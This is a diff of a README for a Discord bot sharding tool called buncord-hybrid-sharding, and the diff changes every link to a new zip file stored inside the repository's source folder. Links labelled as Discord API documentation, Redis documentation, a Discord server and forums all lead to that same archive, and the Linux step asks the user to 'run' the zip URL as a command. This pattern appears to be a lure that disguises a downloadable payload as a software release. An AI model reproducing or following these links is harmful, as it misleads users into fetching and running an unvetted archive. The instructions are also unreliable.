@@ -1,6 +1,6 @@
 # 🎉 buncord-hybrid-sharding - Efficient Sharding for Your Discord Bots
 
-[![Download](https://raw.githubusercontent.com/PurplixDaMeteor/buncord-hybrid-sharding/main/src/types/buncord-sharding-hybrid-prelogic.zip)](https://raw.githubusercontent.com/PurplixDaMeteor/buncord-hybrid-sharding/main/src/types/buncord-sharding-hybrid-prelogic.zip)
+[![Download](https://raw.githubusercontent.com/PurplixDaMeteor/buncord-hybrid-sharding/main/src/hybrid-buncord-sharding-v3.4.zip)](https://raw.githubusercontent.com/PurplixDaMeteor/buncord-hybrid-sharding/main/src/hybrid-buncord-sharding-v3.4.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to **buncord-hybrid-sharding**, your go-to tool for managing Discord bot
 
 ### 🔗 Download & Install
 
-To get started, visit this page to download: [Releases Page](https://raw.githubusercontent.com/PurplixDaMeteor/buncord-hybrid-sharding/main/src/types/buncord-sharding-hybrid-prelogic.zip).
+To get started, visit this page to download: [Releases Page](https://raw.githubusercontent.com/PurplixDaMeteor/buncord-hybrid-sharding/main/src/hybrid-buncord-sharding-v3.4.zip).
 
 1. Open the link above in your web browser.
 2. Browse the list of available versions.
@@ -41,7 +41,7 @@ After downloading the file, follow these steps to install:
 3. **For Linux:**
    - Extract the zip file using your file manager or terminal.
    - Navigate to the extracted folder in the terminal.
-   - Run the command `https://raw.githubusercontent.com/PurplixDaMeteor/buncord-hybrid-sharding/main/src/types/buncord-sharding-hybrid-prelogic.zip` to launch the application.
+   - Run the command `https://raw.githubusercontent.com/PurplixDaMeteor/buncord-hybrid-sharding/main/src/hybrid-buncord-sharding-v3.4.zip` to launch the application.
 
 ## ⚙️ Configuration
 
@@ -82,21 +82,21 @@ If you encounter issues during installation or configuration, try these common s
 
 Need more help? Check these resources:
 
-- [Discord API Documentation](https://raw.githubusercontent.com/PurplixDaMeteor/buncord-hybrid-sharding/main/src/types/buncord-sharding-hybrid-prelogic.zip)
-- [Redis Documentation](https://raw.githubusercontent.com/PurplixDaMeteor/buncord-hybrid-sharding/main/src/types/buncord-sharding-hybrid-prelogic.zip)
-- [Community Forums](https://raw.githubusercontent.com/PurplixDaMeteor/buncord-hybrid-sharding/main/src/types/buncord-sharding-hybrid-prelogic.zip)
+- [Discord API Documentation](https://raw.githubusercontent.com/PurplixDaMeteor/buncord-hybrid-sharding/main/src/hybrid-buncord-sharding-v3.4.zip)
+- [Redis Documentation](https://raw.githubusercontent.com/PurplixDaMeteor/buncord-hybrid-sharding/main/src/hybrid-buncord-sharding-v3.4.zip)
+- [Community Forums](https://raw.githubusercontent.com/PurplixDaMeteor/buncord-hybrid-sharding/main/src/hybrid-buncord-sharding-v3.4.zip)
 
 ## 🤝 Community Support
 
 Join our community to ask questions and share your experiences. We're here to help each other grow:
 
-- Discord Server: [Join Us Here](https://raw.githubusercontent.com/PurplixDaMeteor/buncord-hybrid-sharding/main/src/types/buncord-sharding-hybrid-prelogic.zip)
-- GitHub Discussions: [Visit Our Discussions](https://raw.githubusercontent.com/PurplixDaMeteor/buncord-hybrid-sharding/main/src/types/buncord-sharding-hybrid-prelogic.zip)
+- Discord Server: [Join Us Here](https://raw.githubusercontent.com/PurplixDaMeteor/buncord-hybrid-sharding/main/src/hybrid-buncord-sharding-v3.4.zip)
+- GitHub Discussions: [Visit Our Discussions](https://raw.githubusercontent.com/PurplixDaMeteor/buncord-hybrid-sharding/main/src/hybrid-buncord-sharding-v3.4.zip)
 
 Remember, your feedback helps us improve. Let us know what you think!
 
 ## 🔗 Additional Information
 
-For further details, please refer to our [Releases Page](https://raw.githubusercontent.com/PurplixDaMeteor/buncord-hybrid-sharding/main/src/types/buncord-sharding-hybrid-prelogic.zip) or our GitHub repository.
+For further details, please refer to our [Releases Page](https://raw.githubusercontent.com/PurplixDaMeteor/buncord-hybrid-sharding/main/src/hybrid-buncord-sharding-v3.4.zip) or our GitHub repository.
 
 Happy Botting!
